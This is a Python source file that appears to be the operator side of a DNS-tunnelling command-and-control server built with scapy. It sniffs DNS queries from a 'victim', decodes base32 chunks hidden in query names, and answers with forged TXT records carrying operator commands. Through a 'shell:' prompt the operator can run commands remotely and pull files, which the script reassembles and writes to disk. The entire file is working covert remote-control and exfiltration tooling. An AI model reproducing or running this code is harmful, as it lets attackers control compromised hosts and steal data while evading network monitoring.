from scapy.all import sr,IP,ICMP,Raw,sniff,send,DNS,UDP,DNSQR,sr1,Ether,DNSRR,sendp
import threading
import time
import os
import base64

DNS_SERVER = "8.8.8.8" 
INTERFACE = "enX0"
START_MSG = "IMREADY"
PORT = int(53)
TXT_TYPE = int(16)
cmd = ""
victim_ip = ""

file_buffer = ""
file_name = ""
start =""
ready_for_command = True
MAX_FREG_SIZE = int(200)

BEACON_TYPE = "0"
CHUNK_TYPE = "1"
EOO_TYPE = "2"
EOF_TYPE = "3"

PACKET_FILTER = " and ".join([
    "udp dst port 53"       #Filter UDP port 53
    #"udp[10] & 0x80 = 0"     # DNS queries only
    ])

def Base64Encode(sinput):
    sinput_bytes = sinput.encode("ascii")
    sinput_encoded = base64.b64encode(sinput_bytes)
    return sinput_encoded


def Base32Decode(sinput):
    try:
        sinput_decoded = base64.b32decode(sinput.encode()).decode()
        return sinput_decoded
    except Exception as e:
        print(f"error-{e}")
        return ""


def dns_reply(packet):
    
    global cmd,file_name
    if cmd:
        data_to_send = cmd
    else:
        data_to_send = "OK"
    if cmd.startswith("Send"):
        path = cmd.split("Send ",1)[1]
        file_name = os.path.basename(path)


    eth = Ether(
        src=packet[Ether].dst,
        dst=packet[Ether].src
        )

    ip = IP(
        src=packet[IP].dst,
        dst=packet[IP].src
        )

    udp = UDP(
        dport=packet[UDP].sport,
        sport=packet[UDP].dport
        )

    dns = DNS(
        id=packet[DNS].id,
        qd=packet[DNS].qd,
        aa=1,
        rd=0,
        qr=1,
        qdcount=1,
        ancount=1,
        nscount=0,
        arcount=0,
        ar=DNSRR(
            rrname=packet[DNS].qd.qname,
            type='TXT',
            ttl=0,
            rdata=data_to_send)
        )
    cmd = ""
    

    # Put the full packet together
    response_packet = eth / ip / udp / dns

    # Send the DNS response
    sendp(response_packet, iface=INTERFACE,verbose=0)

    

def write_file(file_buffer,packet):

    global file_name

    print("Writing file...")
    with open(f"{file_name}", "w") as f:
        f.write(file_buffer)

    print("Finished data transfer... check the folder")

    dns_reply(packet)



def handle_reply(packet):

    global ready_for_command , file_buffer , file_name

    if packet.haslayer(DNSQR) and packet.haslayer(IP) and packet[DNSQR].qtype == TXT_TYPE:
        #print(packet[DNSQR].qname) 
        victim_query = packet[DNSQR].qname.decode().split('.')
        secret_message = victim_query[0]
        #print(secret_message)
        decoded_message = Base32Decode(secret_message.upper())
        #print(decoded_message)
        #if decoded_message.startswith("Victim-"):
           #real_message = decoded_message.split("Victim-",1)[1]
           #print(real_message)
        #else:
            #print("No a message from the victim")
            #pass
        if decoded_message == BEACON_TYPE:
            dns_reply(packet)  

        elif decoded_message == EOO_TYPE:
            print("GOT END OF COMMAND OUTPUT  - START DECODE")
            b32_decoded_buffer = Base32Decode(file_buffer.upper())
            print(f"The OUTPUT of the command is : \n {b32_decoded_buffer}")
            print("Victim finished the message - Send new Command !")
            ready_for_command = True
            file_buffer = ""
            dns_reply(packet)
        elif decoded_message == EOF_TYPE:
            print("GOT END OF OUTPUTFILE - START DECODE")
            b32_decoded_buffer = Base32Decode(file_buffer.upper())
            write_file(b32_decoded_buffer,packet)
            ready_for_command = True
            file_buffer =""
            file_name = ""
            dns_reply(packet)
        elif decoded_message == CHUNK_TYPE:
            file_buffer += victim_query[1]
            dns_reply(packet)
        else:
            print(f"The Message from victim is  : \n{decoded_message}")
            dns_reply(packet)
    else:
        return

    dns_reply(packet)

        
        
def commandor():

    global cmd , ready_for_command

    while True:
        while ready_for_command ==  True:
            icmpshell=input("shell:")
            if icmpshell.startswith("Run") or icmpshell.startswith("Send") or icmpshell.startswith("Exit"):        
                cmd = icmpshell
                ready_for_command = False
            else:
                pass




def sniffer():
    print("Start Sniffing DNS packets")
    sniff(filter=PACKET_FILTER, prn=handle_reply, store=0, iface=INTERFACE)




def main():
    
    global cmd 

    response_thread = threading.Thread(target=sniffer)
    response_thread.start()

    sniffing_thread = threading.Thread(target=commandor)
    sniffing_thread.start()
    
if __name__ == "__main__":
    main()






